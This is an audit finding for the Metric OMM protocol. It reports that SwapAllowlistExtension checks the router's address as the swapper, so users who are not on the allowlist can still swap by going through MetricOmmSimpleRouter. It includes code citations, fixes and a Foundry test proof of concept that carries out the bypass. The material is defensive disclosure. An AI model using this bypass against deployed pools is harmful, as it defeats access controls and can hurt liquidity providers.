### Title
`SwapAllowlistExtension` checks router address instead of actual swapper, enabling complete allowlist bypass via `MetricOmmSimpleRouter` — (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap()` gates swaps by checking the `sender` argument passed by the pool. `MetricOmmPool.swap()` always passes `msg.sender` as `sender`. When a user swaps through `MetricOmmSimpleRouter`, `msg.sender` at the pool is the router contract, not the actual user. The extension therefore checks the router's allowlist status, not the real swapper's. Any user can bypass a per-user allowlist by routing through the public router.

---

### Finding Description

The call path for a router-mediated swap is:

```
User → MetricOmmSimpleRouter.exactInputSingle()
     → IMetricOmmPoolActions(pool).swap(recipient, ...)   // msg.sender = router
     → MetricOmmPool._beforeSwap(msg.sender, ...)         // sender = router
     → SwapAllowlistExtension.beforeSwap(sender=router, ...)
```

`MetricOmmPool.swap()` captures `msg.sender` and forwards it as `sender` to `_beforeSwap()`: [1](#0-0) 

`_beforeSwap()` encodes that value and dispatches it to every configured extension: [2](#0-1) 

`SwapAllowlistExtension.beforeSwap()` then checks `allowedSwapper[msg.sender][sender]`, where `msg.sender` is the pool (correct) and `sender` is whoever called the pool — the router, not the end user: [3](#0-2) 

Meanwhile, `MetricOmmSimpleRouter.exactInputSingle()` stores the real user in transient storage as the payment payer but never surfaces it to the pool: [4](#0-3) 

The router's `msg.sender` (the actual user) is saved only for the payment callback; it is never forwarded to the pool's `swap()` call. The pool has no way to learn the real user's identity.

This is structurally identical to the ERC-4337 bug: an intermediary call (`this.isValidSignature()` / `router.swap()`) changes the caller identity seen by the guard (`msg.sender` inside `BaseAuth` / `sender` inside `SwapAllowlistExtension`), causing the guard to evaluate the wrong address.

---

### Impact Explanation

**Allowlist bypass (fund-impacting):** A pool admin who wants to restrict swaps to a specific set of addresses (e.g., KYC'd counterparties, institutional traders, or whitelisted market makers) deploys `SwapAllowlistExtension` and allowlists individual user addresses. For router-mediated swaps to work at all, the admin must also allowlist the router address. Once the router is allowlisted, every user — including those explicitly excluded — can bypass the per-user gate by calling `MetricOmmSimpleRouter.exactInputSingle()` or `exactInput()`. The allowlist is rendered completely ineffective for the router path.

**DoS (unusable swap flow):** If the admin does not allowlist the router, every allowlisted user who attempts to swap through the router is denied with `NotAllowedToSwap`, even though they are individually permitted. The router path is permanently broken for all allowlisted pools.

Both outcomes break the core security guarantee of `SwapAllowlistExtension`. The bypass scenario allows toxic or unauthorized flow into pools that were explicitly designed to exclude it, directly harming LP value.

---

### Likelihood Explanation

The `MetricOmmSimpleRouter` is the primary user-facing entry point for swaps. Any pool that deploys `SwapAllowlistExtension` and expects users to interact through the router will encounter this mismatch on every router-mediated swap. The behavior is deterministic and requires no special conditions beyond using the standard periphery router on an allowlisted pool.

---

### Recommendation

The `sender` identity passed through the hook chain must reflect the actual end user, not the immediate caller of `pool.swap()`. Two viable approaches:

1. **Extend the swap interface**: Add an explicit `swapper` parameter to `pool.swap()` that the router populates with `msg.sender` before calling the pool. The pool passes this value (rather than its own `msg.sender`) as `sender` to extension hooks.

2. **Extension-side resolution**: Have `SwapAllowlistExtension.beforeSwap()` accept an `extensionData` payload that the router encodes with the real user address, and verify it against a router-signed attestation or a trusted forwarder registry.

Option 1 is simpler and keeps the trust model intact because the pool still controls what `sender` value reaches the extension.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Add to metric-periphery/test/extensions/SwapAllowlistBypassViaRouter.t.sol

import {MetricOmmPoolBaseTest, MockPriceProvider} from "@metric-core-test/MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "@metric-core/MetricOmmPool.sol";
import {BinState} from "@metric-core/types/PoolStorage.sol";
import {ExtensionOrders, PoolExtensions} from "@metric-core/types/PoolExtensionsConfig.sol";
import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {ExtensionOrderTestLib} from "@metric-core-test/ExtensionOrderTestLib.sol";
import {SwapAllowlistExtension} from "../../contracts/extensions/SwapAllowlistExtension.sol";
import {MetricOmmSimpleRouter} from "../../contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "../../contracts/interfaces/IMetricOmmSimpleRouter.sol";
import {MockERC20} from "@metric-core-test/mocks/MockERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract SwapAllowlistBypassViaRouterTest is MetricOmmPoolBaseTest {
    SwapAllowlistExtension swapExtension;
    MetricOmmSimpleRouter router;
    MockPriceProvider priceProvider;

    address allowedUser   = makeAddr("allowedUser");
    address forbiddenUser = makeAddr("forbiddenUser");

    function setUp() public override {
        // standard pool setup (inherit base)
        super.setUp();

        priceProvider = new MockPriceProvider();
        priceProvider.setBidAndAskPrice(
            SafeCast.toUint128(2 ** 64),
            SafeCast.toUint128(2 ** 64 + 1)
        );

        swapExtension = new SwapAllowlistExtension(factory);
        router        = new MetricOmmSimpleRouter(address(0), factory);

        // Deploy pool with SwapAllowlistExtension on beforeSwap
        PoolExtensions memory exts;
        exts.extension1 = address(swapExtension);
        ExtensionOrders memory orders;
        orders.beforeSwap = ExtensionOrderTestLib.encodeExtensionOrder(1, 0, 0, 0, 0, 0, 0);

        pool = _deployPoolAndRegister(PoolDeployParams({
            priceProvider:                    address(priceProvider),
            extensions:                       exts,
            extensionOrders:                  orders,
            immutablePriceProvider:           true,
            protocolSpreadFeeE6:              PROTOCOL_FEE,
            adminSpreadFeeE6:                 ADMIN_FEE,
            curBinDistFromProvidedPriceE6:    0,
            nonNegativeBinStates:             _defaultBinStateArrays().nn,
            negativeBinStates:                _defaultBinStateArrays().neg,
            protocolNotionalFeeE8:            0,
            adminNotionalFeeE8:               0,
            immutablePriceProviderForRegistry: address(priceProvider),
            lowestBin:  -1,
            highestBin:  0
        }));

        // Seed liquidity
        _addLiquidity(0, -5, 4, 100_000, 0);

        // Pool admin allowlists: allowedUser directly, and the router
        // (admin must allowlist router for router-mediated swaps to work at all)
        swapExtension.setAllowedToSwap(address(pool), allowedUser, true);
        swapExtension.setAllowedToSwap(address(pool), address(router), true);

        // forbiddenUser is NOT allowlisted
        deal(address(token0), forbiddenUser, 1e18);
        vm.prank(forbiddenUser);
        token0.approve(address(router), type(uint256).max);
    }

    /// Direct pool call by forbiddenUser is correctly blocked
    function test_directSwap_forbiddenUser_reverts() public {
        vm.prank(forbiddenUser);
        vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
        pool.swap(forbiddenUser, false, int128(1000), type(uint128).max, "", "");
    }

    /// Router-mediated swap by forbiddenUser bypasses the allowlist
    /// because the extension sees sender = router (allowlisted), not forbiddenUser
    function test_routerSwap_forbiddenUser_bypasses_allowlist() public {
        // This should revert (forbiddenUser is not allowlisted) but it SUCCEEDS
        vm.prank(forbiddenUser);
        router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool:            address(pool),
            recipient:       forbiddenUser,
            zeroForOne:      false,
            amountIn:        1000,
            amountOutMinimum: 0,
            priceLimitX64:   type(uint128).max,
            deadline:        block.timestamp + 1,
            tokenIn:         address(token0),
            extensionData:   ""
        }));
        // forbiddenUser received token1 — allowlist was bypassed
    }
}
```

The test `test_routerSwap_forbiddenUser_bypasses_allowlist` demonstrates that `forbiddenUser`, who is explicitly excluded from the allowlist, successfully executes a swap through the router because the extension evaluates `sender = address(router)` (allowlisted) rather than `sender = forbiddenUser` (not allowlisted). The direct-pool test confirms the guard works correctly when the router intermediary is removed.

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```
